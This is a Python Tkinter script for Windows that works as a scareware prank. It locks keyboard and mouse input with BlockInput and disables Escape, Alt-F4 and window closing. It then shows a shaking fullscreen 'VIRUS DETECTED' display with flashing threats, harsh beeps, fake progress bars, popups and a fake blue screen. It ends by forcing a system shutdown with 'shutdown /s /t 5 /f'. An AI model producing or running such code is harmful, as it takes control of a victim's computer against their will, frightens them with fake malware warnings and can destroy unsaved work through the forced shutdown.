import tkinter as tk
from tkinter import ttk
import time
import random
import os
import threading
import winsound
import ctypes

# --- Input Locking (Windows) ---

def lock_input():
    ctypes.windll.user32.BlockInput(True)

def unlock_input():
    ctypes.windll.user32.BlockInput(False)

# --- GUI Madness ---

root = tk.Tk()
root.title("SYSTEM ANNIHILATION")
root.attributes("-fullscreen", True)
root.configure(bg="#300000")
root.overrideredirect(True)

# Block escape keys
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.bind("<Control-c>", lambda e: None)
root.bind("<Alt-F4>", lambda e: None)
root.bind("<Escape>", lambda e: None)

flash_ids = []
shake_id = None

def flash_text(label, text_list, index=0):
    global flash_ids
    if label.winfo_exists():
        label.config(
            text=text_list[index % len(text_list)],
            fg=random.choice(["red", "white", "#FF5555", "#FF0000"]),
            font=("Courier", random.randint(50, 100), "bold")
        )
        flash_id = root.after(random.randint(80, 250), flash_text, label, text_list, index + 1)
        flash_ids.append(flash_id)

def shake_window():
    global shake_id
    if root.winfo_exists():
        x, y = root.winfo_x(), root.winfo_y()
        root.geometry(f"+{x + random.randint(-50, 50)}+{y + random.randint(-50, 50)}")
        shake_id = root.after(15, shake_window)

def play_terrifying_sound():
    if os.name == "nt":
        def sound_horror():
            for _ in range(20):
                winsound.Beep(random.randint(800, 2500), random.randint(50, 200))
                time.sleep(random.uniform(0.01, 0.08))
            for _ in range(10):
                winsound.Beep(random.randint(80, 300), 400)
                winsound.Beep(random.randint(1000, 2000), 50)
                time.sleep(random.uniform(0.05, 0.2))
            for _ in range(15):
                winsound.Beep(random.randint(50, 1500), random.randint(100, 500))
                time.sleep(random.uniform(0.02, 0.1))
            winsound.Beep(60, 2000)
        threading.Thread(target=sound_horror, daemon=True).start()

def fake_progress(progress, value=0):
    if value <= 100 and progress.winfo_exists():
        progress["value"] = value + random.randint(0, 15)
        progress["style"] = random.choice(["red.Horizontal.TProgressbar", "default.Horizontal.TProgressbar"])
        root.update()
        root.after(15, fake_progress, progress, value + 1)

def dramatic_popup(message, delay):
    popup = tk.Toplevel(bg="#300000")
    x, y = random.randint(0, root.winfo_screenwidth() - 600), random.randint(0, root.winfo_screenheight() - 400)
    popup.geometry(f"600x400+{x}+{y}")
    popup.overrideredirect(True)
    tk.Label(
        popup,
        text=message,
        font=("Courier", random.randint(24, 50), "bold"),
        fg=random.choice(["red", "white", "#FF0000"]),
        bg="#300000"
    ).pack(pady=100)
    popup.after(delay, popup.destroy)

# --- FAKE BSOD ---

def show_bsod():
    bsod = tk.Toplevel()
    bsod.attributes("-fullscreen", True)
    bsod.configure(bg="#0000AA")
    bsod.overrideredirect(True)
    message = (
        ":(\n\n"
        "Your PC ran into a problem and needs to restart.\n"
        "We're just collecting some error info, and then we'll restart for you.\n\n"
        "STOP CODE: SYSTEM_CRASH_SIMULATION\n\n"
        "If you call a support person, give them this info:\n"
        "KERNEL PANIC - SYSTEM TERMINATION\n"
    )
    tk.Label(bsod, text=message, fg="white", bg="#0000AA", font=("Consolas", 28), justify="left").pack(padx=100, pady=100)

# --- Sequence ---

def troll_sequence():
    style = ttk.Style()
    style.configure("red.Horizontal.TProgressbar", troughcolor="#300000", background="red")

    shake_window()
    play_terrifying_sound()

    title = tk.Label(root, text="VIRUS DETECTED", font=("Courier", 80, "bold"), fg="red", bg="#300000")
    title.pack(pady=60)
    flash_text(title, ["VIRUS DETECTED", "SYSTEM ANNIHILATED", "DATA DEVASTATED", "TERMINAL COLLAPSE", "ENDGAME"])

    warning = tk.Label(root, text="YOUR SYSTEM IS BEING RIPPED APART!", font=("Courier", 40), fg="white", bg="#300000")
    warning.pack(pady=50)
    flash_text(warning, ["YOUR SYSTEM IS BEING RIPPED APART!", "ALL HOPE IS GONE!", "DESTRUCTION UNSTOPPABLE!", "FINAL DOOM!"])

    progress_label = tk.Label(root, text="ERADICATING EVERYTHING...", font=("Courier", 32), fg="red", bg="#300000")
    progress_label.pack(pady=25)
    progress = ttk.Progressbar(root, length=800, mode="determinate", maximum=100, style="red.Horizontal.TProgressbar")
    progress.pack(pady=25)

    root.after(500, fake_progress, progress)
    root.after(1000, dramatic_popup, "CONTAINMENT BREACHED!", 1500)
    root.after(2000, dramatic_popup, "DRIVES DISINTEGRATING...", 2000)
    root.after(3500, dramatic_popup, "MEMORY MELTING!", 1500)
    root.after(5000, dramatic_popup, "NETWORK SHATTERED!", 1800)
    root.after(6500, dramatic_popup, "CRITICAL CORE FAILURE!", 2000)
    root.after(8500, dramatic_popup, "SHUTDOWN PROTOCOL CORRUPTED!", 1500)
    root.after(10000, dramatic_popup, "DATA SCREAMING IN AGONY!", 2000)
    root.after(12000, dramatic_popup, "HARDWARE DISINTEGRATION!", 1800)
    root.after(14000, dramatic_popup, "FINAL COLLAPSE INITIATED!", 2000)
    root.after(16000, dramatic_popup, "INSANITY OVERLOAD!", 1500)
    root.after(18000, dramatic_popup, "SYSTEM DEVOURING ITSELF!", 2000)
    root.after(20000, dramatic_popup, "NO ESCAPE DETECTED!", 1800)
    root.after(22000, dramatic_popup, "TERMINATION IN 5...4...3...", 2000)
    root.after(25000, dramatic_popup, "ALL IS LOST FOREVER!", 2500)
    root.after(28000, dramatic_popup, "ANNIHILATION COMPLETE", 2000)
    root.after(30000, show_bsod)
    root.after(35000, shutdown_system)

def shutdown_system():
    unlock_input()
    if os.name == "nt":
        os.system("shutdown /s /t 5 /f")  # Force shutdown in 5 seconds

# --- START ---

def start():
    lock_input()
    troll_sequence()

start()
root.mainloop()
